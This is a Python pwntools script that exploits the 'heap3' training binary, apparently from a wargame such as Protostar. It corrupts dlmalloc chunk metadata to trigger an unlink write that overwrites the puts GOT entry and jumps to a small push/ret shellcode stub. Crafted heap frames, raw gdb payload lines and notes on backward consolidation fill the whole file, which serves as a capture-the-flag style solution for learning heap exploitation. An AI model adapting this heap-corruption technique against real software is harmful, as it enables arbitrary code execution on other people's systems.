from pwn import *

# (gdb) run
#       $(python -c 'print "A"*4 + "\x68\x64\x88\x04\x08" + "\xc3" + "A"*22')
#       $(python -c 'print "A"*32 + "\xf0\xff\xff\xff" + "\xfc\xff\xff\xff"')
#       $(python -c 'print "A"*8+"\xf1\xff\xff\xff"*2+"\x1c\xb1\x04\x08"+
#                                "\x0c\xc0\x04\x08"+"A"*8')


class Heap(object):
    def __init__(self, allocator, destination, source):
        """
        allocator : Name of the allocator
        destination : Address that you wish to overwrite.
        source : Address from which you wish to copy data to the
        destination. *(source+8) should be writable.

        Once the `free` happens, the code at `source` will be
        executed.
        """
        self.allocator = allocator
        self.destination = destination
        self.source = source

    def get_frame(self):
        """
        Returns a tuple.
        (metadata, crafted_block)
        metadata should be used to overwrite the metadata of the next block.
        crafted_block will be the block placed in memory
        """

        """
        http://phrack.org/issues/57/9.html#article
        1. LSB of SIZE should be 0
        2. PREV_SIZE and SIZE should be add-safe
        3. At chunk boundary + size + 4, the lowest bit should be zero'd out.
        """
        """
        In [6]: c_int32(0xfffffff0)
        Out[6]: c_int(-16)
        In [7]: c_int32(0xfffffffc)
        Out[7]: c_int(-4)


        Alloc'd chunk addresses :
            0x0804C000
            0x0804C028    - 40
            0x0804C050    - 40

        exploitation by backward consolidation
        """

        PREV_SIZE, SIZE = pack(0xfffffff0), pack(0xfffffffc)
        metadata = PREV_SIZE + SIZE

        data = "A"*8 + pack(0xfffffff1)*2 + pack(self.destination-12) + pack(self.source) + "A"*8
        return metadata, data


PUTS_GOT = 0x0804b128
SC = 0x0804c00c
h = Heap("dlmalloc", PUTS_GOT, SC)

# shellcode
first = "A"*4 + asm("push 0x08048864") + asm("ret")

# heap frame
second, third = h.get_frame()
second = "A"*32 + second

p = process(["./heap3", first, second, third])
print p.recvline()



